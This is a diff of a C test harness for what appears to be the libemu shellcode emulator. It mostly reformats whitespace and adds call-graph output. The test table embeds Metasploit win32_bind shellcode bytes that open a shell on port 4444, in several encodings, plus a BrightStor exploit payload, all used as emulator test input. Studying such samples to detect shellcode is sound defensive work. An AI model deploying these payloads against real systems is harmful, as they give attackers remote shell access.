@@ -7,7 +7,7 @@
 #include <stdio.h>
 
 #ifndef _GNU_SOURCE
-#define _GNU_SOURCE
+	#define _GNU_SOURCE
 #endif
 #include <getopt.h>
 
@@ -18,7 +18,9 @@
 #include "emu/emu_log.h"
 #include "emu/emu_cpu_data.h"
 #include "emu/environment/win32/emu_env_w32.h"
+#include "emu/environment/win32/emu_env_w32_dll_export.h"
 #include "emu/emu_getpc.h"
+#include "emu/emu_graph.h"
 
 
 #define CODE_OFFSET 0x402001
@@ -36,6 +38,7 @@ static struct run_time_options
 	uint32_t steps;
 	int testnumber;
 	int getpc;
+	char *graphfile;
 } opts;
 
 static const char *regm[] = {
@@ -43,11 +46,11 @@ static const char *regm[] = {
 };
 
 
-	                         /* 0     1     2     3      4       5       6     7 */
+/* 0     1     2     3      4       5       6     7 */
 static const char *flags[] = { "CF", "  ", "PF", "  " , "AF"  , "    ", "ZF", "SF", 
-	                           "TF", "IF", "DF", "OF" , "IOPL", "IOPL", "NT", "  ",
-	                           "RF", "VM", "AC", "VIF", "RIP" , "ID"  , "  ", "  ",
-	                           "  ", "  ", "  ", "   ", "    ", "    ", "  ", "  "};
+	"TF", "IF", "DF", "OF" , "IOPL", "IOPL", "NT", "  ",
+	"RF", "VM", "AC", "VIF", "RIP" , "ID"  , "  ", "  ",
+	"  ", "  ", "  ", "   ", "    ", "    ", "  ", "  "};
 
 
 struct instr_test
@@ -60,15 +63,15 @@ struct instr_test
 	struct 
 	{
 		uint32_t reg[8];
-		uint32_t		mem_state[2];
-		uint32_t	eflags;
+		uint32_t        mem_state[2];
+		uint32_t    eflags;
 	} in_state;
 
 	struct 
 	{
 		uint32_t reg[8];
-		uint32_t		mem_state[2];
-		uint32_t	eflags;
+		uint32_t        mem_state[2];
+		uint32_t    eflags;
 		uint32_t eip;
 	} out_state;
 };
@@ -79,14 +82,14 @@ struct instr_test tests[] =
 {
 
 /*  {
-        .instr = "instr",
-        .in_state.reg  = {0,0,0,0,0,0,0,0 },
-        .in_state.mem_state = {0, 0},
-        .out_state.reg  = {0,0,0,0,0,0,0,0 },
-        .out_state.mem_state = {0, 0},
-    },*/
+		.instr = "instr",
+		.in_state.reg  = {0,0,0,0,0,0,0,0 },
+		.in_state.mem_state = {0, 0},
+		.out_state.reg  = {0,0,0,0,0,0,0,0 },
+		.out_state.mem_state = {0, 0},
+	},*/
 
-	{	
+	{   
 		.instr ="win32_bind -  EXITFUNC=seh LPORT=4444 Size=317 Encoder=None http://metasploit.com",
 		.code = 
 		"\xfc\x6a\xeb\x4d\xe8\xf9\xff\xff\xff\x60\x8b\x6c\x24\x24\x8b\x45"
@@ -110,35 +113,35 @@ struct instr_test tests[] =
 		"\xff\xd6\x6a\xff\xff\x37\xff\xd0\x8b\x57\xfc\x83\xc4\x64\xff\xd6"
 		"\x52\xff\xd0\x68\xf0\x8a\x04\x5f\x53\xff\xd6\xff\xd0",
 		.codesize = 317,
-		.in_state.reg  = {0,0x71ab675b,0x71ac4070,0,0x22ccb0,0x22cd98,0x611001a0,0x401380}, // ollydbg
+		.in_state.reg  = {0,0x71ab675b,0x71ac4070,0,0x22ccb0,0x22cd98,0x611001a0,0x401380},	// ollydbg
 		.in_state.mem_state = {0, 0},
 	},
 	{
 		.instr = "win32_bind -  EXITFUNC=seh LPORT=4444 Size=344 Encoder=Pex http://metasploit.com",
 		.code =  
 
-                "\x33\xc9\x83\xe9\xb0\xe8\xff\xff\xff\xff\xc0\x5e\x81\x76\x0e\x47"
-                "\x13\x2b\xc0\x83\xee\xfc\xe2\xf4\xbb\x79\xc0\x8d\xaf\xea\xd4\x3f"
-                "\xb8\x73\xa0\xac\x63\x37\xa0\x85\x7b\x98\x57\xc5\x3f\x12\xc4\x4b"
-                "\x08\x0b\xa0\x9f\x67\x12\xc0\x89\xcc\x27\xa0\xc1\xa9\x22\xeb\x59"
-                "\xeb\x97\xeb\xb4\x40\xd2\xe1\xcd\x46\xd1\xc0\x34\x7c\x47\x0f\xe8"
-                "\x32\xf6\xa0\x9f\x63\x12\xc0\xa6\xcc\x1f\x60\x4b\x18\x0f\x2a\x2b"
-                "\x44\x3f\xa0\x49\x2b\x37\x37\xa1\x84\x22\xf0\xa4\xcc\x50\x1b\x4b"
-                "\x07\x1f\xa0\xb0\x5b\xbe\xa0\x80\x4f\x4d\x43\x4e\x09\x1d\xc7\x90"
-                "\xb8\xc5\x4d\x93\x21\x7b\x18\xf2\x2f\x64\x58\xf2\x18\x47\xd4\x10"
-                "\x2f\xd8\xc6\x3c\x7c\x43\xd4\x16\x18\x9a\xce\xa6\xc6\xfe\x23\xc2"
-                "\x12\x79\x29\x3f\x97\x7b\xf2\xc9\xb2\xbe\x7c\x3f\x91\x40\x78\x93"
-                "\x14\x40\x68\x93\x04\x40\xd4\x10\x21\x7b\x3a\x9c\x21\x40\xa2\x21"
-                "\xd2\x7b\x8f\xda\x37\xd4\x7c\x3f\x91\x79\x3b\x91\x12\xec\xfb\xa8"
-                "\xe3\xbe\x05\x29\x10\xec\xfd\x93\x12\xec\xfb\xa8\xa2\x5a\xad\x89"
-                "\x10\xec\xfd\x90\x13\x47\x7e\x3f\x97\x80\x43\x27\x3e\xd5\x52\x97"
-                "\xb8\xc5\x7e\x3f\x97\x75\x41\xa4\x21\x7b\x48\xad\xce\xf6\x41\x90"
-                "\x1e\x3a\xe7\x49\xa0\x79\x6f\x49\xa5\x22\xeb\x33\xed\xed\x69\xed"
-                "\xb9\x51\x07\x53\xca\x69\x13\x6b\xec\xb8\x43\xb2\xb9\xa0\x3d\x3f"
-                "\x32\x57\xd4\x16\x1c\x44\x79\x91\x16\x42\x41\xc1\x16\x42\x7e\x91"
-                "\xb8\xc3\x43\x6d\x9e\x16\xe5\x93\xb8\xc5\x41\x3f\xb8\x24\xd4\x10"
-                "\xcc\x44\xd7\x43\x83\x77\xd4\x16\x15\xec\xfb\xa8\xb7\x99\x2f\x9f"
-                "\x14\xec\xfd\x3f\x97\x13\x2b\xc0",
+		"\x33\xc9\x83\xe9\xb0\xe8\xff\xff\xff\xff\xc0\x5e\x81\x76\x0e\x47"
+		"\x13\x2b\xc0\x83\xee\xfc\xe2\xf4\xbb\x79\xc0\x8d\xaf\xea\xd4\x3f"
+		"\xb8\x73\xa0\xac\x63\x37\xa0\x85\x7b\x98\x57\xc5\x3f\x12\xc4\x4b"
+		"\x08\x0b\xa0\x9f\x67\x12\xc0\x89\xcc\x27\xa0\xc1\xa9\x22\xeb\x59"
+		"\xeb\x97\xeb\xb4\x40\xd2\xe1\xcd\x46\xd1\xc0\x34\x7c\x47\x0f\xe8"
+		"\x32\xf6\xa0\x9f\x63\x12\xc0\xa6\xcc\x1f\x60\x4b\x18\x0f\x2a\x2b"
+		"\x44\x3f\xa0\x49\x2b\x37\x37\xa1\x84\x22\xf0\xa4\xcc\x50\x1b\x4b"
+		"\x07\x1f\xa0\xb0\x5b\xbe\xa0\x80\x4f\x4d\x43\x4e\x09\x1d\xc7\x90"
+		"\xb8\xc5\x4d\x93\x21\x7b\x18\xf2\x2f\x64\x58\xf2\x18\x47\xd4\x10"
+		"\x2f\xd8\xc6\x3c\x7c\x43\xd4\x16\x18\x9a\xce\xa6\xc6\xfe\x23\xc2"
+		"\x12\x79\x29\x3f\x97\x7b\xf2\xc9\xb2\xbe\x7c\x3f\x91\x40\x78\x93"
+		"\x14\x40\x68\x93\x04\x40\xd4\x10\x21\x7b\x3a\x9c\x21\x40\xa2\x21"
+		"\xd2\x7b\x8f\xda\x37\xd4\x7c\x3f\x91\x79\x3b\x91\x12\xec\xfb\xa8"
+		"\xe3\xbe\x05\x29\x10\xec\xfd\x93\x12\xec\xfb\xa8\xa2\x5a\xad\x89"
+		"\x10\xec\xfd\x90\x13\x47\x7e\x3f\x97\x80\x43\x27\x3e\xd5\x52\x97"
+		"\xb8\xc5\x7e\x3f\x97\x75\x41\xa4\x21\x7b\x48\xad\xce\xf6\x41\x90"
+		"\x1e\x3a\xe7\x49\xa0\x79\x6f\x49\xa5\x22\xeb\x33\xed\xed\x69\xed"
+		"\xb9\x51\x07\x53\xca\x69\x13\x6b\xec\xb8\x43\xb2\xb9\xa0\x3d\x3f"
+		"\x32\x57\xd4\x16\x1c\x44\x79\x91\x16\x42\x41\xc1\x16\x42\x7e\x91"
+		"\xb8\xc3\x43\x6d\x9e\x16\xe5\x93\xb8\xc5\x41\x3f\xb8\x24\xd4\x10"
+		"\xcc\x44\xd7\x43\x83\x77\xd4\x16\x15\xec\xfb\xa8\xb7\x99\x2f\x9f"
+		"\x14\xec\xfd\x3f\x97\x13\x2b\xc0",
 		.codesize = 344,
 		.in_state.reg  = {0,0xfffffe6c,0,0,0x12fe98,0x12ff74,0x12fe9c,0x12ff74}, // ollydbg
 		.in_state.mem_state = {0, 0},
@@ -146,52 +149,52 @@ struct instr_test tests[] =
 	{
 		.instr = "win32_bind -  EXITFUNC=seh LPORT=4444 Size=709 Encoder=PexAlphaNum http://metasploit.com",
 		.code =  
-	
-				"\xeb\x03\x59\xeb\x05\xe8\xf8\xff\xff\xff\x4f\x49\x49\x49\x49\x49"
-                "\x49\x51\x5a\x56\x54\x58\x36\x33\x30\x56\x58\x34\x41\x30\x42\x36"
-                "\x48\x48\x30\x42\x33\x30\x42\x43\x56\x58\x32\x42\x44\x42\x48\x34"
-                "\x41\x32\x41\x44\x30\x41\x44\x54\x42\x44\x51\x42\x30\x41\x44\x41"
-                "\x56\x58\x34\x5a\x38\x42\x44\x4a\x4f\x4d\x4e\x4f\x4c\x56\x4b\x4e"
-                "\x4d\x44\x4a\x4e\x49\x4f\x4f\x4f\x4f\x4f\x4f\x4f\x42\x46\x4b\x48"
-                "\x4e\x46\x46\x52\x46\x52\x4b\x38\x45\x54\x4e\x33\x4b\x38\x4e\x47"
-                "\x45\x30\x4a\x57\x41\x30\x4f\x4e\x4b\x38\x4f\x54\x4a\x51\x4b\x38"
-                "\x4f\x45\x42\x52\x41\x50\x4b\x4e\x49\x44\x4b\x58\x46\x43\x4b\x58"
-                "\x41\x50\x50\x4e\x41\x53\x42\x4c\x49\x49\x4e\x4a\x46\x48\x42\x4c"
-                "\x46\x37\x47\x50\x41\x4c\x4c\x4c\x4d\x50\x41\x50\x44\x4c\x4b\x4e"
-                "\x46\x4f\x4b\x33\x46\x45\x46\x52\x4a\x42\x45\x47\x45\x4e\x4b\x48"
-                "\x4f\x55\x46\x52\x41\x30\x4b\x4e\x48\x56\x4b\x48\x4e\x50\x4b\x34"
-                "\x4b\x48\x4f\x35\x4e\x41\x41\x50\x4b\x4e\x43\x50\x4e\x52\x4b\x38"
-                "\x49\x58\x4e\x36\x46\x32\x4e\x31\x41\x36\x43\x4c\x41\x33\x4b\x4d"
-                "\x46\x56\x4b\x38\x43\x54\x42\x33\x4b\x48\x42\x34\x4e\x30\x4b\x58"
-                "\x42\x57\x4e\x41\x4d\x4a\x4b\x38\x42\x54\x4a\x30\x50\x55\x4a\x46"
-                "\x50\x48\x50\x54\x50\x30\x4e\x4e\x42\x45\x4f\x4f\x48\x4d\x48\x56"
-                "\x43\x55\x48\x46\x4a\x46\x43\x33\x44\x43\x4a\x46\x47\x57\x43\x57"
-                "\x44\x53\x4f\x55\x46\x35\x4f\x4f\x42\x4d\x4a\x46\x4b\x4c\x4d\x4e"
-                "\x4e\x4f\x4b\x53\x42\x35\x4f\x4f\x48\x4d\x4f\x45\x49\x48\x45\x4e"
-                "\x48\x36\x41\x58\x4d\x4e\x4a\x30\x44\x50\x45\x55\x4c\x56\x44\x30"
-                "\x4f\x4f\x42\x4d\x4a\x46\x49\x4d\x49\x50\x45\x4f\x4d\x4a\x47\x45"
-                "\x4f\x4f\x48\x4d\x43\x35\x43\x55\x43\x35\x43\x45\x43\x35\x43\x54"
-                "\x43\x45\x43\x34\x43\x55\x4f\x4f\x42\x4d\x48\x46\x4a\x46\x41\x51"
-                "\x4e\x35\x48\x36\x43\x35\x49\x58\x41\x4e\x45\x49\x4a\x36\x46\x4a"
-                "\x4c\x41\x42\x37\x47\x4c\x47\x45\x4f\x4f\x48\x4d\x4c\x46\x42\x41"
-                "\x41\x55\x45\x35\x4f\x4f\x42\x4d\x4a\x56\x46\x4a\x4d\x4a\x50\x52"
-                "\x49\x4e\x47\x45\x4f\x4f\x48\x4d\x43\x35\x45\x45\x4f\x4f\x42\x4d"
-                "\x4a\x56\x45\x4e\x49\x44\x48\x58\x49\x34\x47\x45\x4f\x4f\x48\x4d"
-                "\x42\x55\x46\x35\x46\x55\x45\x35\x4f\x4f\x42\x4d\x43\x39\x4a\x46"
-                "\x47\x4e\x49\x37\x48\x4c\x49\x47\x47\x35\x4f\x4f\x48\x4d\x45\x45"
-                "\x4f\x4f\x42\x4d\x48\x36\x4c\x46\x46\x46\x48\x46\x4a\x56\x43\x46"
-                "\x4d\x56\x49\x48\x45\x4e\x4c\x36\x42\x55\x49\x45\x49\x42\x4e\x4c"
-                "\x49\x38\x47\x4e\x4c\x46\x46\x54\x49\x38\x44\x4e\x41\x43\x42\x4c"
-                "\x43\x4f\x4c\x4a\x50\x4f\x44\x44\x4d\x42\x50\x4f\x44\x34\x4e\x52"
-                "\x43\x39\x4d\x48\x4c\x37\x4a\x33\x4b\x4a\x4b\x4a\x4b\x4a\x4a\x56"
-                "\x44\x37\x50\x4f\x43\x4b\x48\x31\x4f\x4f\x45\x37\x46\x34\x4f\x4f"
-                "\x48\x4d\x4b\x55\x47\x55\x44\x55\x41\x45\x41\x55\x41\x45\x4c\x56"
-                "\x41\x50\x41\x35\x41\x55\x45\x55\x41\x55\x4f\x4f\x42\x4d\x4a\x56"
-                "\x4d\x4a\x49\x4d\x45\x50\x50\x4c\x43\x45\x4f\x4f\x48\x4d\x4c\x36"
-                "\x4f\x4f\x4f\x4f\x47\x33\x4f\x4f\x42\x4d\x4b\x48\x47\x45\x4e\x4f"
-                "\x43\x38\x46\x4c\x46\x56\x4f\x4f\x48\x4d\x44\x45\x4f\x4f\x42\x4d"
-                "\x4a\x46\x42\x4f\x4c\x48\x46\x50\x4f\x35\x43\x35\x4f\x4f\x48\x4d"
-                "\x4f\x4f\x42\x4d\x5a",
+
+		"\xeb\x03\x59\xeb\x05\xe8\xf8\xff\xff\xff\x4f\x49\x49\x49\x49\x49"
+		"\x49\x51\x5a\x56\x54\x58\x36\x33\x30\x56\x58\x34\x41\x30\x42\x36"
+		"\x48\x48\x30\x42\x33\x30\x42\x43\x56\x58\x32\x42\x44\x42\x48\x34"
+		"\x41\x32\x41\x44\x30\x41\x44\x54\x42\x44\x51\x42\x30\x41\x44\x41"
+		"\x56\x58\x34\x5a\x38\x42\x44\x4a\x4f\x4d\x4e\x4f\x4c\x56\x4b\x4e"
+		"\x4d\x44\x4a\x4e\x49\x4f\x4f\x4f\x4f\x4f\x4f\x4f\x42\x46\x4b\x48"
+		"\x4e\x46\x46\x52\x46\x52\x4b\x38\x45\x54\x4e\x33\x4b\x38\x4e\x47"
+		"\x45\x30\x4a\x57\x41\x30\x4f\x4e\x4b\x38\x4f\x54\x4a\x51\x4b\x38"
+		"\x4f\x45\x42\x52\x41\x50\x4b\x4e\x49\x44\x4b\x58\x46\x43\x4b\x58"
+		"\x41\x50\x50\x4e\x41\x53\x42\x4c\x49\x49\x4e\x4a\x46\x48\x42\x4c"
+		"\x46\x37\x47\x50\x41\x4c\x4c\x4c\x4d\x50\x41\x50\x44\x4c\x4b\x4e"
+		"\x46\x4f\x4b\x33\x46\x45\x46\x52\x4a\x42\x45\x47\x45\x4e\x4b\x48"
+		"\x4f\x55\x46\x52\x41\x30\x4b\x4e\x48\x56\x4b\x48\x4e\x50\x4b\x34"
+		"\x4b\x48\x4f\x35\x4e\x41\x41\x50\x4b\x4e\x43\x50\x4e\x52\x4b\x38"
+		"\x49\x58\x4e\x36\x46\x32\x4e\x31\x41\x36\x43\x4c\x41\x33\x4b\x4d"
+		"\x46\x56\x4b\x38\x43\x54\x42\x33\x4b\x48\x42\x34\x4e\x30\x4b\x58"
+		"\x42\x57\x4e\x41\x4d\x4a\x4b\x38\x42\x54\x4a\x30\x50\x55\x4a\x46"
+		"\x50\x48\x50\x54\x50\x30\x4e\x4e\x42\x45\x4f\x4f\x48\x4d\x48\x56"
+		"\x43\x55\x48\x46\x4a\x46\x43\x33\x44\x43\x4a\x46\x47\x57\x43\x57"
+		"\x44\x53\x4f\x55\x46\x35\x4f\x4f\x42\x4d\x4a\x46\x4b\x4c\x4d\x4e"
+		"\x4e\x4f\x4b\x53\x42\x35\x4f\x4f\x48\x4d\x4f\x45\x49\x48\x45\x4e"
+		"\x48\x36\x41\x58\x4d\x4e\x4a\x30\x44\x50\x45\x55\x4c\x56\x44\x30"
+		"\x4f\x4f\x42\x4d\x4a\x46\x49\x4d\x49\x50\x45\x4f\x4d\x4a\x47\x45"
+		"\x4f\x4f\x48\x4d\x43\x35\x43\x55\x43\x35\x43\x45\x43\x35\x43\x54"
+		"\x43\x45\x43\x34\x43\x55\x4f\x4f\x42\x4d\x48\x46\x4a\x46\x41\x51"
+		"\x4e\x35\x48\x36\x43\x35\x49\x58\x41\x4e\x45\x49\x4a\x36\x46\x4a"
+		"\x4c\x41\x42\x37\x47\x4c\x47\x45\x4f\x4f\x48\x4d\x4c\x46\x42\x41"
+		"\x41\x55\x45\x35\x4f\x4f\x42\x4d\x4a\x56\x46\x4a\x4d\x4a\x50\x52"
+		"\x49\x4e\x47\x45\x4f\x4f\x48\x4d\x43\x35\x45\x45\x4f\x4f\x42\x4d"
+		"\x4a\x56\x45\x4e\x49\x44\x48\x58\x49\x34\x47\x45\x4f\x4f\x48\x4d"
+		"\x42\x55\x46\x35\x46\x55\x45\x35\x4f\x4f\x42\x4d\x43\x39\x4a\x46"
+		"\x47\x4e\x49\x37\x48\x4c\x49\x47\x47\x35\x4f\x4f\x48\x4d\x45\x45"
+		"\x4f\x4f\x42\x4d\x48\x36\x4c\x46\x46\x46\x48\x46\x4a\x56\x43\x46"
+		"\x4d\x56\x49\x48\x45\x4e\x4c\x36\x42\x55\x49\x45\x49\x42\x4e\x4c"
+		"\x49\x38\x47\x4e\x4c\x46\x46\x54\x49\x38\x44\x4e\x41\x43\x42\x4c"
+		"\x43\x4f\x4c\x4a\x50\x4f\x44\x44\x4d\x42\x50\x4f\x44\x34\x4e\x52"
+		"\x43\x39\x4d\x48\x4c\x37\x4a\x33\x4b\x4a\x4b\x4a\x4b\x4a\x4a\x56"
+		"\x44\x37\x50\x4f\x43\x4b\x48\x31\x4f\x4f\x45\x37\x46\x34\x4f\x4f"
+		"\x48\x4d\x4b\x55\x47\x55\x44\x55\x41\x45\x41\x55\x41\x45\x4c\x56"
+		"\x41\x50\x41\x35\x41\x55\x45\x55\x41\x55\x4f\x4f\x42\x4d\x4a\x56"
+		"\x4d\x4a\x49\x4d\x45\x50\x50\x4c\x43\x45\x4f\x4f\x48\x4d\x4c\x36"
+		"\x4f\x4f\x4f\x4f\x47\x33\x4f\x4f\x42\x4d\x4b\x48\x47\x45\x4e\x4f"
+		"\x43\x38\x46\x4c\x46\x56\x4f\x4f\x48\x4d\x44\x45\x4f\x4f\x42\x4d"
+		"\x4a\x46\x42\x4f\x4c\x48\x46\x50\x4f\x35\x43\x35\x4f\x4f\x48\x4d"
+		"\x4f\x4f\x42\x4d\x5a",
 
 		.codesize = 709,
 		.in_state.reg  = {0,0xfffffe6c,0,0,0x12fe98,0x12ff74,0x12fe9c,0x12ff74}, // ollydbg
@@ -201,28 +204,28 @@ struct instr_test tests[] =
 	{
 		.instr = "win32_bind -  EXITFUNC=seh LPORT=4444 Size=344 Encoder=PexFnstenvSub http://metasploit.com",
 		.code =                  
-				"\x31\xc9\x83\xe9\xb0\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\x02"
-                "\x19\x61\x76\x83\xeb\xfc\xe2\xf4\xfe\x73\x8a\x3b\xea\xe0\x9e\x89"
-                "\xfd\x79\xea\x1a\x26\x3d\xea\x33\x3e\x92\x1d\x73\x7a\x18\x8e\xfd"
-                "\x4d\x01\xea\x29\x22\x18\x8a\x3f\x89\x2d\xea\x77\xec\x28\xa1\xef"
-                "\xae\x9d\xa1\x02\x05\xd8\xab\x7b\x03\xdb\x8a\x82\x39\x4d\x45\x5e"
-                "\x77\xfc\xea\x29\x26\x18\x8a\x10\x89\x15\x2a\xfd\x5d\x05\x60\x9d"
-                "\x01\x35\xea\xff\x6e\x3d\x7d\x17\xc1\x28\xba\x12\x89\x5a\x51\xfd"
-                "\x42\x15\xea\x06\x1e\xb4\xea\x36\x0a\x47\x09\xf8\x4c\x17\x8d\x26"
-                "\xfd\xcf\x07\x25\x64\x71\x52\x44\x6a\x6e\x12\x44\x5d\x4d\x9e\xa6"
-                "\x6a\xd2\x8c\x8a\x39\x49\x9e\xa0\x5d\x90\x84\x10\x83\xf4\x69\x74"
-                "\x57\x73\x63\x89\xd2\x71\xb8\x7f\xf7\xb4\x36\x89\xd4\x4a\x32\x25"
-                "\x51\x4a\x22\x25\x41\x4a\x9e\xa6\x64\x71\x70\x2a\x64\x4a\xe8\x97"
-                "\x97\x71\xc5\x6c\x72\xde\x36\x89\xd4\x73\x71\x27\x57\xe6\xb1\x1e"
-                "\xa6\xb4\x4f\x9f\x55\xe6\xb7\x25\x57\xe6\xb1\x1e\xe7\x50\xe7\x3f"
-                "\x55\xe6\xb7\x26\x56\x4d\x34\x89\xd2\x8a\x09\x91\x7b\xdf\x18\x21"
-                "\xfd\xcf\x34\x89\xd2\x7f\x0b\x12\x64\x71\x02\x1b\x8b\xfc\x0b\x26"
-                "\x5b\x30\xad\xff\xe5\x73\x25\xff\xe0\x28\xa1\x85\xa8\xe7\x23\x5b"
-                "\xfc\x5b\x4d\xe5\x8f\x63\x59\xdd\xa9\xb2\x09\x04\xfc\xaa\x77\x89"
-                "\x77\x5d\x9e\xa0\x59\x4e\x33\x27\x53\x48\x0b\x77\x53\x48\x34\x27"
-                "\xfd\xc9\x09\xdb\xdb\x1c\xaf\x25\xfd\xcf\x0b\x89\xfd\x2e\x9e\xa6"
-                "\x89\x4e\x9d\xf5\xc6\x7d\x9e\xa0\x50\xe6\xb1\x1e\xf2\x93\x65\x29"
-                "\x51\xe6\xb7\x89\xd2\x19\x61\x76",
+		"\x31\xc9\x83\xe9\xb0\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\x02"
+		"\x19\x61\x76\x83\xeb\xfc\xe2\xf4\xfe\x73\x8a\x3b\xea\xe0\x9e\x89"
+		"\xfd\x79\xea\x1a\x26\x3d\xea\x33\x3e\x92\x1d\x73\x7a\x18\x8e\xfd"
+		"\x4d\x01\xea\x29\x22\x18\x8a\x3f\x89\x2d\xea\x77\xec\x28\xa1\xef"
+		"\xae\x9d\xa1\x02\x05\xd8\xab\x7b\x03\xdb\x8a\x82\x39\x4d\x45\x5e"
+		"\x77\xfc\xea\x29\x26\x18\x8a\x10\x89\x15\x2a\xfd\x5d\x05\x60\x9d"
+		"\x01\x35\xea\xff\x6e\x3d\x7d\x17\xc1\x28\xba\x12\x89\x5a\x51\xfd"
+		"\x42\x15\xea\x06\x1e\xb4\xea\x36\x0a\x47\x09\xf8\x4c\x17\x8d\x26"
+		"\xfd\xcf\x07\x25\x64\x71\x52\x44\x6a\x6e\x12\x44\x5d\x4d\x9e\xa6"
+		"\x6a\xd2\x8c\x8a\x39\x49\x9e\xa0\x5d\x90\x84\x10\x83\xf4\x69\x74"
+		"\x57\x73\x63\x89\xd2\x71\xb8\x7f\xf7\xb4\x36\x89\xd4\x4a\x32\x25"
+		"\x51\x4a\x22\x25\x41\x4a\x9e\xa6\x64\x71\x70\x2a\x64\x4a\xe8\x97"
+		"\x97\x71\xc5\x6c\x72\xde\x36\x89\xd4\x73\x71\x27\x57\xe6\xb1\x1e"
+		"\xa6\xb4\x4f\x9f\x55\xe6\xb7\x25\x57\xe6\xb1\x1e\xe7\x50\xe7\x3f"
+		"\x55\xe6\xb7\x26\x56\x4d\x34\x89\xd2\x8a\x09\x91\x7b\xdf\x18\x21"
+		"\xfd\xcf\x34\x89\xd2\x7f\x0b\x12\x64\x71\x02\x1b\x8b\xfc\x0b\x26"
+		"\x5b\x30\xad\xff\xe5\x73\x25\xff\xe0\x28\xa1\x85\xa8\xe7\x23\x5b"
+		"\xfc\x5b\x4d\xe5\x8f\x63\x59\xdd\xa9\xb2\x09\x04\xfc\xaa\x77\x89"
+		"\x77\x5d\x9e\xa0\x59\x4e\x33\x27\x53\x48\x0b\x77\x53\x48\x34\x27"
+		"\xfd\xc9\x09\xdb\xdb\x1c\xaf\x25\xfd\xcf\x0b\x89\xfd\x2e\x9e\xa6"
+		"\x89\x4e\x9d\xf5\xc6\x7d\x9e\xa0\x50\xe6\xb1\x1e\xf2\x93\x65\x29"
+		"\x51\xe6\xb7\x89\xd2\x19\x61\x76",
 		.codesize = 344,
 		.in_state.reg  = {0,0xfffffe6c,0,0,0x12fe98,0x12ff74,0x12fe9c,0x12ff74}, // ollydbg
 		.in_state.mem_state = {0, 0},
@@ -406,7 +409,7 @@ struct instr_test tests[] =
 		.in_state.reg  = {0,0xfffffe6c,0,0,0x12fe98,0x12ff74,0x12fe9c,0x12ff74}, // ollydbg
 		.in_state.mem_state = {0, 0},
 	},
-    {
+	{
 		.instr = "brihgtstor discovery",
 		.code =  "\xeb\x06\x41\x41\x14\x57\x80\x23"	  // 0x0030  AAAAAAAA  ..AA.W.#"
 				 "\xeb\x10\x5b\x4b\x33\xc9\x66\xb9\x25\x01\x80\x34\x0b\x99\xe2\xfa"	  // 0x0040  ..[K3.f.  %..4...."
@@ -699,6 +702,20 @@ struct instr_test tests[] =
 
 };
 
+struct instr_vertex
+{
+	uint32_t    eip;
+	char        *instr_string;
+};
+
+struct instr_vertex *instr_vertex_new(uint32_t theeip, const char *instr_string)
+{
+	struct instr_vertex *iv = (struct instr_vertex *)malloc(sizeof(struct instr_vertex));
+	memset(iv, 0, sizeof(struct instr_vertex));
+	iv->eip = theeip;
+	iv->instr_string = strdup(instr_string);
+	return iv;
+}
 
 int test(int n)
 {
@@ -709,7 +726,7 @@ int test(int n)
 	struct emu_env_w32 *env = emu_env_w32_new(e);
 
 
-	if (env == 0)
+	if ( env == 0 )
 	{
 		printf("%s \n", emu_strerror(e));
 		printf("%s \n", strerror(emu_errno(e)));
@@ -731,7 +748,7 @@ int test(int n)
 */
 
 
-	for (i=0;i<sizeof(tests)/sizeof(struct instr_test);i++)
+	for ( i=0;i<sizeof(tests)/sizeof(struct instr_test);i++ )
 	{
 		if ( n != -1 && i != n )
 			continue;
@@ -765,54 +782,156 @@ int test(int n)
 		emu_cpu_eip_set(emu_cpu_get(e), static_offset);
 
 		/* run the code */
-		if (opts.verbose == 1 )
+		if ( opts.verbose == 1 )
 		{
 			emu_log_level_set(emu_logging_get(e),EMU_LOG_DEBUG);
 			emu_cpu_debug_print(cpu);
 			emu_log_level_set(emu_logging_get(e),EMU_LOG_NONE);
 		}
 
+
+		struct emu_vertex **vertexes = NULL;
+		struct emu_vertex *last_vertex = NULL;
+		struct emu_graph *graph = NULL;
+
+		if ( opts.graphfile != NULL )
+		{
+			graph = emu_graph_new();
+			vertexes = (struct emu_vertex **)malloc(sizeof(struct emu_vertex *) * tests[i].codesize * 2);
+			memset(vertexes, 0, sizeof(struct emu_vertex *) * tests[i].codesize * 2);
+		}
+
+
 		int ret; //= emu_cpu_run(emu_cpu_get(e));
 
-		for (j=0;j<opts.steps;j++)
+		for ( j=0;j<opts.steps;j++ )
 		{
 
-			if (opts.verbose == 1)
+			if ( opts.verbose == 1 )
 			{
 				emu_log_level_set(emu_logging_get(e),EMU_LOG_DEBUG);
 				emu_cpu_debug_print(cpu);
 				emu_log_level_set(emu_logging_get(e),EMU_LOG_NONE);
 			}
 
+			uint32_t eipsave = emu_cpu_eip_get(emu_cpu_get(e));
 
-			ret = emu_env_w32_eip_check(env);
-			if (ret == 1)
-				continue;
-			else if (ret == 0)
+			struct emu_env_w32_dll_export *dllhook = NULL;
+			struct emu_vertex *ev = NULL;
+			struct instr_vertex *iv = NULL;
+
+
+
+			ret = 0;
+
+			dllhook = emu_env_w32_eip_check(env);
+			if ( dllhook != NULL )
+			{
+				if ( opts.graphfile != NULL )
+				{
+					// FIXME duplicate dll calls get new nodes BUG
+					ev = emu_vertex_new();
+					iv = instr_vertex_new(eipsave,dllhook->fnname);
+					emu_vertex_data_set(ev, iv);
+					emu_graph_vertex_add(graph, ev);
+
+					if ( last_vertex != NULL )
+                    	emu_vertex_edge_add(last_vertex, ev);
+                    
+					last_vertex = ev;
+				}
+			}
+			else
+			{
+
 				ret = emu_cpu_parse(emu_cpu_get(e));
 
+				if ( ret != -1 )
+				{
 
+					if ( opts.graphfile != NULL )
+					{
+						struct emu_vertex *ev;
+						if ( ( ev = vertexes[emu_cpu_eip_get(emu_cpu_get(e)) - static_offset]) == NULL )
+						{
+							ev = emu_vertex_new();
+							vertexes[emu_cpu_eip_get(emu_cpu_get(e)) - static_offset] = ev;
+							iv = instr_vertex_new(emu_cpu_eip_get(emu_cpu_get(e)),emu_cpu_get(e)->instr_string);
+							emu_vertex_data_set(ev, iv);
+							emu_graph_vertex_add(graph, ev);
 
-			if (ret != -1)
-			{
-				ret = emu_cpu_step(emu_cpu_get(e));
+						}
+
+						if ( last_vertex != NULL )
+							emu_vertex_edge_add(last_vertex, ev);
+
+						last_vertex = ev;
+
+					}
+				}
+
+				if ( ret != -1 )
+				{
+					ret = emu_cpu_step(emu_cpu_get(e));
+				}
+
+				if ( ret == -1 )
+				{
+					printf("cpu error %s\n", emu_strerror(e));
+					break;
+				}
+
 			}
 
-			if ( ret == -1 )
-			{
